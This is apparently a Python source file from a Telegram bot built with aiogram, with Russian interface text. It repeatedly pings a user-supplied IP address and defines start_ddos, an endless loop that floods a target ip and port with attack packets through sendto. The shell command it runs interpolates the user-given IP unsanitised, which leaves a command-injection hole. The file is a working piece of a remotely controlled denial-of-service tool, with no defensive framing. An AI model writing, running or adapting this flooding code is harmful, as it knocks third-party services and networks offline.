import asyncio
import os.path

from aiogram.dispatcher.storage import FSMContextProxy
from aiogram.types import Message

from loader import dp


async def get_timeout():
    await asyncio.sleep(600)


async def get_ping(message: Message, dos_data: FSMContextProxy):
    current_path = os.path.dirname(os.path.abspath(__file__))
    msg = await message.answer(f"Текущее состояние пакетов по данному IP-адресу:")
    i = 0
    while await dp.current_state().get_state() != 'DosState:stopped_script':
        i += 1
        cmd = f"sh '{current_path}/ping.sh' {dos_data['ip']}"
        proc = await asyncio.create_subprocess_shell(
            cmd=cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        await msg.edit_text(f"Текущее состояние пакетов по данному IP-адресу:\n{stdout.decode()}\n\n"
                            f"Количество обновлений: {i}")


def start_ddos(connect, ip: str, port: int, attack: bytes):
    while True:
        connect.sendto(attack, (ip, port))
